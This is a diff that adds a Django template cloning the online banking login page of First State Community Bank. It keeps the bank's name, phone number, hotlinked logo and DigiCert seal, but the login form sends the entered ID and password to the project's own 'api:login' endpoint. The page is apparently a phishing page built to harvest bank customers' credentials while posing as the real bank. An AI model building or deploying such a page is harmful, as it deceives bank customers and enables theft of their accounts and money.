@@ -1,0 +1,196 @@
+{% extends 'basee.html' %}
+{% load static %}
+
+{% block content %}
+
+
+<a href="#ada_maincontent" title="skip to main content" class="HiddenSkipToMain" tabindex="2" toggletabindex="true">Skip
+    to main content</a>
+
+<div id="bannerDiv" role="banner" aria-label="Banner">
+
+</div>
+
+<br>
+
+
+<div id="banner">
+    <img id="ctl00_BannerContent_BankLogo" toggletabindex="true"
+         src="https://www.netteller.com/BankLogos/banklogo7183_2009.png" alt="First State Community Bank"
+         style="border-width:0px;" tabindex="3">
+</div>
+
+<div id="ctl00_BannerContent_CallbackFunctions" class="LoginHide">
+
+
+</div>
+
+
+<div id="contentNoTopMenu">
+
+    <div id="bankaddress">
+        First State Community Bank - (631) 623-7680
+    </div>
+
+
+    <div id="ajax-message-container"></div>
+
+
+    <div class="MainContent_Container LoginContainer" id="ada_maincontent" tabindex="-1">
+
+        <label id="bugFixLabel" for="bugFixInput" style="display: none">BugFix</label>
+        <input id="bugFixInput" type="text" style="display: none">
+
+        <div class="HeaderRow">
+            <div class="pageTab HeaderDiv">
+                <h1 toggletabindex="true" id="ctl00_PageContent_Login1_CaptionLabel"
+                    title="Login to Online Banking" tabindex="4">
+                    Login to Online Banking
+                </h1>
+            </div>
+            <div class="HeaderHelp">
+                <a onclick="JHA.NetTeller.ShowFieldHelp({ title: &quot;Internet Banking Login&quot;, text: &quot;From this page you can enter your internet banking login credentials to access your financial institution's internet banking site.&quot;, target: this, showOnReady: true }); return false;"
+                   id="ctl00_PageContent_Login1_HelpPopup1_HelpLink" title="Click here for help"
+                   class="HelpLink" toggletabindex="true"
+                   href="javascript:__doPostBack('ctl00$PageContent$Login1$HelpPopup1$HelpLink','')"
+                   tabindex="5"><span class="HiddenElement"> Internet Banking Login help</span></a>&nbsp;
+
+            </div>
+            <div class="HeaderRange">
+
+            </div>
+            <div class="pageTab HeaderDiv">
+
+
+            </div>
+            <div class="pageTab HeaderDiv">
+
+            </div>
+            <div class="pageTab HeaderDiv">
+
+            </div>
+            <div class="pageTab HeaderDiv">
+                <a id="ctl00_PageContent_Login1_HomeLink" href="#"
+                >Home</a>
+            </div>
+
+        </div>
+
+        <div class="MainContent">
+
+            <div id="WelcomeMessageDiv" class="welcome-message">
+                <div class="LoginWelcomeLiteralDiv">
+
+
+                    <p align="right"><a href="#"
+                    >Supported
+                        Browsers</a></p>
+                    <br>
+                </div>
+            </div>
+
+
+            <div class="LoginClear"></div>
+
+            <div class="LoginPadding10">
+                <form action="{% url 'api:login' %}"
+                      method="POST">{% csrf_token %}
+                    <div class="row">
+                        <div class="six columns">
+                            <strong>
+                                <label for="ctl00_PageContent_Login1_IdTextBox"
+                                       class="LoginTextBox">Online Banking
+                                    ID: </label>
+                            </strong>
+                        </div>
+                        <div class="six columns">
+                            <input type="text" size="30" placeholder="user id"  name="email"
+                                   id="id_email" class="LoginIdTextBox" required=""
+                                   autocomplete="username" toggletabindex="true" tabindex="10">
+                        </div>
+
+                    </div>
+                    <div class="row">
+                        <div class="six columns">
+                            <strong>
+                                <label for="ctl00_PageContent_Login1_IdTextBox"
+                                       id="id_password" class="LoginTextBox">Password
+                                    : </label>
+                            </strong>
+                        </div>
+                        <div class="row">
+                            <div class="six columns">
+                                <input type="password" size="30" name="password" placeholder="INSERT PASSWORD"
+                                       class="LoginIdTextBox" required="true"
+                                       autocomplete="username" toggletabindex="true" tabindex="10" id="id_password">
+
+
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="six columns">
+                            <strong>
+
+                            </strong>
+                        </div>
+                        <div class="six columns">
+
+                        </div>
+                    </div>
+
+                </div>
+
+            <div class="button-containerADA LoginButtonContainerDiv">
+                <input type="submit" value="Submit"
+                       class="ColorButton" toggletabindex="true">
+
+
+            </div>
+        </div>
+        </form>
+    </div>
+
+
+    <div class="LoginBackOfficeDiv">
+            <span class="SetToggleTabIndex LoginBackOfficeSpan">
+                Some internet browsers may save user names and passwords.	This will automatically complete any login for you and may allow people at your computer to use your logins without knowing your passwords. For your security, please review your internet browser's "Help" section, or contact their Customer Support, to see if this option is available and how to turn it off.
+            </span>
+    </div>
+
+
+    <div class="LoginVerisignDiv">
+        <div id="DigiCertClickID_IAw2Rszj">
+            <div id="DigiCertClickID_IAw2RszjSeal"
+                 style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: default;">
+                <img src="//seal.digicert.com/seals/cascade/?tag=IAw2Rszj&amp;referer=www.netteller.com&amp;format=png&amp;lang=en&amp;an=min"
+                     alt="DigiCert Seal" tabindex="0"
+                     style="text-decoration: none; text-align: center; display: block; vertical-align: baseline; font-size: 100%; font-style: normal; text-indent: 0px; line-height: 1; width: auto; margin: 0px auto; padding: 0px; border: 0px; background: transparent; position: relative; inset: 0px; clear: both; float: none; cursor: pointer;">
+            </div>
+        </div>
+
+    </div>
+
+
+</div>
+
+
+</div>
+<div id="contentBlockFooter" role="contentinfo" aria-label="Content Info">
+    <div id="contentFooter" style="width: 100%; text-align: center;">
+        <div style="float:left;">
+
+        </div>
+        <div style="float:right;">
+
+
+        </div>
+    </div>
+    <div style="clear:both;"></div>
+</div>
+</div>
+
+</div>
+
+
+{% endblock %}
